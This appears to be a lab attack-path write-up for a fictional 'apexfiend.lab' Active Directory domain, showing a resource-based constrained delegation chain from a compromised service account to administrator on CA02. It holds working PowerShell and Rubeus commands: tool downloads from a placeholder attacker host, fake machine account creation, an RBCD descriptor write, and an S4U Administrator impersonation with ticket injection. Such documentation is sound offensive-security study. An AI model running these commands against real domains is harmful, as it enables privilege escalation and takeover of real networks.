# Apexfiend — RBCD Path (svc_automation$ → CA02)

## 1. Purpose

This document continues from `jenkins-path.md`: a shell as `corp\svc_automation$`, obtained via the `ApexAutomationAgent` service hijack on `JENKINS01`. It narrates the confirmed, tested execution of the `WriteDacl`/RBCD chain already analyzed at the ACL level in `02-active-directory/delegated-permissions.md`, Section 2, landing local administrative access on `CA02`.

## 2. Confirming the Delegated Right

```text
whoami: corp\svc_automation$
```

Enumeration from this shell confirms the gMSA holds the delegated right already documented: `WriteDacl`, inherited as `WriteProperty` on computer objects, over `OU=corp-infrastructure` — the OU `CA02$` sits in directly (`delegated-permissions.md`, Section 2). **Because this `WriteProperty` is already inherited directly onto `CA02$`, no separate "grant myself rights first" step is required** — the design-level description of this stage (`00-overview/attack-path.md`, Stage 11: "self-granted rights, configure RBCD") simplifies in practice to a single, direct write against the target attribute, since the necessary write access was already present.

## 3. Setting Up an Attacker-Controlled Identity

PowerView and Powermad are staged to the host:

```powershell
iwr -uri http://<attacker>/Powermad.ps1 -outfile Powermad.ps1
iwr -uri http://<attacker>/PowerView.ps1 -outfile PowerView.ps1
Import-Module .\PowerView.ps1
Import-Module .\Powermad.ps1
```

```powershell
Get-DomainObject -Identity 'DC=corp,DC=apexfiend,DC=lab' | select ms-ds-machineaccountquota
# → 10 (unmodified default)
```

The default `ms-DS-MachineAccountQuota` of 10 — confirmed unrestricted — permits any authenticated domain principal, including `svc_automation$`, to create new computer accounts via Powermad's `New-MachineAccount`. A computer account, `FakeComputer$`, is created this way to serve as the attacker-controlled identity the RBCD configuration will trust.

## 4. Confirming CA02's Starting State

```powershell
Get-DomainComputer CA02 | select name,msds-allowedtoactonbehalfofotheridentity
# → (empty)
```

Matches `02-active-directory/kerberos.md`, Section 2 exactly — `CA02$`'s RBCD attribute is still empty immediately before this stage, confirming the attack had not been pre-staged.

## 5. Configuring RBCD

A raw security descriptor is built, granting `FakeComputer$` the generic-rights combination standard to RBCD configuration (`CCDCLCSWRPWPDTLOCRSDRCWDWO` — effectively full control over the delegation relationship), and written directly into `CA02$`'s `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute using PowerView's `Set-DomainObject` — the `WriteProperty` right confirmed in Section 2:

```powershell
$ComputerSid = Get-DomainComputer FakeComputer -Properties objectsid | select -Expand objectsid
$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$sdBytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($sdBytes, 0)
Get-DomainComputer CA02 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sdBytes}
```

Reading the attribute back confirms the write succeeded: the descriptor's discretionary ACL now grants `FakeComputer$`'s SID `AccessAllowed`. `CA02$` now trusts `FakeComputer$` to delegate authentication on its behalf — the RBCD relationship is live.

## 6. S4U2Self / S4U2Proxy — Impersonating Administrator

With `FakeComputer$`'s own credentials (set at creation time), Rubeus performs the full constrained-delegation abuse chain in one call:

```text
Invoke-Rubeus 's4u /user:FakeComputer$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/CA02.corp.apexfiend.lab /ptt'
```

1. A TGT is obtained for `FakeComputer$`.
2. **S4U2Self**: `FakeComputer$` requests a service ticket to itself *as* `Administrator` — permitted because the RBCD relationship configured in Section 5 means `CA02$` (the resource) trusts tickets `FakeComputer$` vouches for.
3. **S4U2Proxy**: that self-referential ticket is exchanged for a real service ticket to `cifs/CA02.corp.apexfiend.lab`, still impersonating `Administrator` — this step is what the RBCD relationship actually authorizes.

The resulting ticket is imported directly into the current session (`/ptt`).

## 7. Landing on CA02

```text
whoami:    ca02\administrator
hostname:  CA02
IP:        172.16.50.103
```

This matches `06-pki/ca02.md` exactly and confirms local administrative access on the Enterprise CA host itself — achieved entirely through the `WriteDacl`/RBCD/S4U chain, without recovering any additional password, hash, or ticket beyond what `svc_automation$`'s own compromised context already provided.

## 8. Chain Summary

```text
svc_automation$ (from jenkins-path.md)
      │  WriteProperty, inherited directly on CA02$ (no self-grant step needed)
      ▼
FakeComputer$ created (MachineAccountQuota = 10, unrestricted)
      │
      ▼
msDS-AllowedToActOnBehalfOfOtherIdentity on CA02$ ← FakeComputer$ (RBCD configured)
      │
      ▼
Rubeus s4u: S4U2Self (as Administrator) → S4U2Proxy (cifs/CA02) → /ptt
      │
      ▼
CA02 — local Administrator access
```

## 9. Validation Status

| Item | Status |
|---|---|
| `svc_automation$`'s inherited `WriteProperty` on `CA02$` | Tested and confirmed — matches prior ACL finding exactly |
| `MachineAccountQuota` unrestricted (10) | Verified |
| `CA02$`'s empty starting RBCD attribute | Verified — matches `kerberos.md` exactly |
| RBCD configuration via direct attribute write | Tested and confirmed |
| S4U2Self/S4U2Proxy chain and ticket injection | Tested and confirmed |
| Local administrative access on `CA02` | Tested and confirmed |

## 10. Related Documentation

- `jenkins-path.md` — Precedes this document; ends with `svc_automation$` access
- `full-attack-chain.md` *(pending)* — Continues from `CA02` administrative access toward the final certificate abuse and DCSync
- `../02-active-directory/delegated-permissions.md`, `kerberos.md` — The design-level analysis this document executes against
- `../06-pki/ca02.md` — The host reached at the end of this chain